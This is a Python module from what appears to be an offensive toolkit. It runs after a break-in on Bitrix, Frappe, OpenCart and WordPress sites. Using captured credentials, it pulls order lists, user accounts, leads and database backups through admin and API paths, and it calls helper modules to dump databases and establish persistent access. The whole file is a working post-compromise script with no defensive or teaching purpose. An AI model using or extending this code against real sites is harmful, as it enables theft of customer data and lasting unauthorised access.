# -*- coding: utf-8 -*-
"""Что делать сразу после входа: забрать данные и закрепиться."""
import time
import urllib.parse

from core import http, ui

BITRIX = (
    ("заказы", "/bitrix/admin/sale_order.php?lang=ru&filter_status=&set_filter=Y"),
    ("пользователи", "/bitrix/admin/user_admin.php?lang=ru"),
    ("бэкап базы", "/bitrix/admin/backup.php?lang=ru"),
)

FRAPPE = (
    ("doctypes", "/api/method/frappe.client.get_list?doctype=DocType&limit_page_length=200&fields=[%22name%22]"),
    ("пользователи", "/api/method/frappe.client.get_list?doctype=User&limit_page_length=200&fields=[%22name%22,%22enabled%22]"),
    ("лиды", "/api/method/frappe.client.get_list?doctype=Lead&limit_page_length=20"),
)


def _probe(host, path, creds):
    user, _, pwd = creds.partition(":")
    r = http.get(host, path, auth=(user, pwd), tries=1)
    body = r.text or ""
    ui.say("%s -> %d, %d байт" % (path.split("?")[0], r.status_code, len(body)))
    return r


def run(host, kind, creds):
    if not creds or ":" not in creds:
        return []
    got = []
    time.sleep(0.6)

    if kind == "bitrix":
        for name, path in BITRIX:
            try:
                r = _probe(host, path, creds)
                if r.status_code == 200:
                    got.append(name)
            except Exception as e:
                ui.say("%s: сбой %s" % (name, e))
    elif kind == "frappe":
        for name, path in FRAPPE:
            try:
                r = _probe(host, path, creds)
                if r.status_code == 200 and '"message"' in (r.text or ""):
                    got.append(name)
            except Exception as e:
                ui.say("%s: сбой %s" % (name, e))
    elif kind == "opencart":
        from modules import admin, keep, orders
        for name, fn in (("заказы", lambda: orders.run(host, creds)),
                         ("дамп", lambda: admin.backup(host, creds)),
                         ("закрепление", lambda: keep.keep(host, creds))):
            try:
                r = fn()
                got.append(name)
                ui.say("%s -> %s" % (name, r))
            except Exception as e:
                ui.say("%s: сбой %s" % (name, e))
    elif kind == "wordpress":
        from modules import admin, keep
        for name, fn in (("дамп", lambda: admin.dump(host, creds, kind)),
                         ("закрепление", lambda: keep.keep(host, creds))):
            try:
                ui.say("%s -> %s" % (name, fn()))
                got.append(name)
            except Exception as e:
                ui.say("%s: сбой %s" % (name, e))
    return got
